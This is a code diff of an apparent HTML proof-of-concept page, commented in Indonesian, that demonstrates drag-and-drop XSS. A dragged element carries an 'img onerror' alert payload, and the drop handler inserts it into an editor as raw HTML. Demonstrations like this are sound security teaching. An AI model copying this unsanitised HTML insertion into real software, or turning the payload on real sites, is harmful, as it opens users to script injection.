@@ -6,7 +6,7 @@
     body { font-family: Arial, sans-serif; margin: 20px; }
     #dragme {
       width: 150px; padding: 15px;
-      background: #4caf50; color: white;
+      background: #ff5722; color: white;
       cursor: grab; user-select: none;
       text-align: center; border-radius: 8px;
     }
@@ -18,8 +18,8 @@
   </style>
 </head>
 <body>
-  <h2>Copy–Drag–Drop XSS Demo</h2>
-  <p>👉 Drag kotak hijau ini lalu drop ke editor di bawah</p>
+  <h2>Drag & Drop XSS PoC</h2>
+  <p>👉 Drag kotak oranye ini lalu drop ke editor di bawah</p>
 
   <div id="dragme" draggable="true">🔥 Drag Me</div>
 
@@ -29,26 +29,29 @@
   </div>
 
   <script>
-    let dragme = document.getElementById("dragme");
-    let editor = document.getElementById("editor");
+    const dragme = document.getElementById("dragme");
+    const editor = document.getElementById("editor");
 
     dragme.addEventListener("dragstart", e => {
-      // payload XSS
-      let payload = `<img src=x onerror=alert('XSS via Drag&Drop')>`;
+      // Payload XSS
+      const payload = `<img src=x onerror="alert('XSS via Drag&Drop!')">`;
       console.log("Dragging payload:", payload);
 
-      // inject payload ke DataTransfer
+      // Inject payload ke DataTransfer
       e.dataTransfer.setData("text/html", payload);
-      e.dataTransfer.setData("text/plain", payload);
+      e.dataTransfer.effectAllowed = "copy";
     });
 
-    // biar bisa drop
+    // Biar bisa drop
     editor.addEventListener("dragover", e => e.preventDefault());
+
     editor.addEventListener("drop", e => {
       e.preventDefault();
-      // ambil payload dari dataTransfer
-      let data = e.dataTransfer.getData("text/html");
-      editor.innerHTML += data;
+      // Ambil payload dari drag data
+      const data = e.dataTransfer.getData("text/html");
+      console.log("Dropped:", data);
+      // Insert raw HTML → trigger XSS
+      editor.insertAdjacentHTML("beforeend", data);
     });
   </script>
 </body>
